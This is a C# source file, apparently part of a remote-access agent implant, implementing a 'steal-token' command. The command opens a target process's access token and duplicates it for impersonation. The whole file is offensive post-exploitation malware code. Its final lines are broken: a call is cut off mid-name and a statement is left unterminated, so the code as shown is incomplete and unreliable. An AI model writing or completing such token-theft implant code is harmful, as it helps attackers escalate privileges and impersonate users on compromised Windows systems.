using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using Agent.Native;

namespace Agent.Commands
{
    public class StealToken : AgentCommand
    {
        public override string Name => "steal-token";

        public override string Execute(AgentTask task)
        {
            if (!int.TryParse(task.Arguments[0], out var pid))
                return "Failed to parse PID";
            var hProcess = Process.GetProcessById(pid).Handle;
            if (!Native.Advapi.OpenProcessToken(hProcess, DesiredAccess.TOKEN_ALL_ACCESS, out var hToken))
                return "Failed to open process token";

            var sa = new SECURITY_ATTRIBUTES();
        if(!Native.Advapi.DuplicateTokenEx(hToken, TokenAccess.TOKEN_ALL_ACCESS, ref sa, SecurityImpersonationLevel.SECURITY_IMPERSONATION, TokenType.TOKEN_IMPERSONATION, out var dupToken))
            Native.Advapi.Cl
            return ""

        }
    }
}
